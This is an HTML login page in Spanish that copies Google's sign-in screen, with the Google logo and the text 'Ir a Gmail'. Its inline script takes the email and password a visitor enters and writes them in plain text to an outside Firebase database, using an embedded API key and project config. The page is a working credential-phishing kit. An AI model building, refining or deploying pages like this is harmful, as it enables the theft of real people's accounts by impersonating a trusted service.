<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Inicia sesi√≥n</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Logo">
    <h1>Inicia sesi√≥n</h1>
    <p class="sub">Ir a Gmail</p>

    <!-- Quitamos action="guardar.php" porque ahora se guarda en Firebase -->
    <form id="loginForm">
      <input type="email" id="correo" placeholder="Correo electr√≥nico o tel√©fono" class="input-field" required>
      <input type="password" id="password" placeholder="Contrase√±a" class="input-field" required>

      <div class="actions">
        <button type="button" class="create-account">Crear cuenta</button>
        <button type="submit" class="next-btn">Siguiente</button>
      </div>
    </form>

    <footer>
      <a href="#">Ayuda</a>
      <a href="#">Privacidad</a>
      <a href="#">T√©rminos</a>
    </footer>
  </div>

  <!-- üî• Script de conexi√≥n a Firebase -->
  <script type="module">
    // Importar m√≥dulos Firebase desde CDN
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";

    // Tu configuraci√≥n (la que ya me diste)
    const firebaseConfig = {
      apiKey: "AIzaSyDRKmSEokWgEsQn4yMxgrc7346UMlnsuKk",
      authDomain: "villnopruebas.firebaseapp.com",
      databaseURL: "https://villnopruebas-default-rtdb.firebaseio.com",
      projectId: "villnopruebas",
      storageBucket: "villnopruebas.firebasestorage.app",
      messagingSenderId: "730093777967",
      appId: "1:730093777967:web:d8b6f50d2648bef1c9c2da",
      measurementId: "G-P23M7EWNG0"
    };

    // Inicializar Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Capturar formulario y guardar datos
    const form = document.getElementById("loginForm");
    form.addEventListener("submit", (e) => {
      e.preventDefault();

      const correo = document.getElementById("correo").value;
      const password = document.getElementById("password").value;

      // Guardar los datos en la base de datos Firebase
      set(ref(db, "usuarios/" + Date.now()), {
        correo: correo,
        password: password
      })
      .then(() => {
        alert("‚úÖ Datos guardados correctamente en Firebase");
        form.reset();
      })
      .catch((error) => {
        alert("‚ùå Error al guardar: " + error);
      });
    });
  </script>

</body>
</html>
